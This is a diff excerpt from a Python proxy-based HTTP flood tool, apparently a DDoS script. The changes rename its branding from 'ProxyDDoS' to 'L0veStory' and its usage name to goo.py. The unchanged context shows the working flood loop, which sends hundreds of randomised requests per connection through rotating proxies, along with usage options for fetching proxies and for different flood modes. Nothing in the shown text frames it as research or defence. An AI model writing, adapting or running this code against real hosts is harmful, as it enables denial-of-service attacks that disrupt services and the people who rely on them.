@@ -411,9 +411,9 @@ def send_requests(): #傳統HTTP FLOOD
             try:
                 for _ in range(400):
                     s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
-                print(f"[ProxyDDoS]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
+                print(f"[L0veStory]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
             except:
-                print(f"[ProxyDDoS]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
+                print(f"[L0veStory]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                 s.close()
                 proxy_ip, proxy_port = random.choice(good_proxies).split(":")
                 proxy_port = int(proxy_port)
@@ -425,7 +425,7 @@ def send_requests(): #傳統HTTP FLOOD
 
 if __name__ == '__main__':
     if len(sys.argv) < 6:
-        print("Usage : proxyddos.py <GET/POST/HEAD> <host> <port> <threads> <path> ")
+        print("Usage : goo.py <GET/POST/HEAD> <host> <port> <threads> <path> ")
         print(" --fetch  | For fetch proxies auto")
         print(" --pps    | Flood with no header")
         print(" --brute  | Flood with less header")
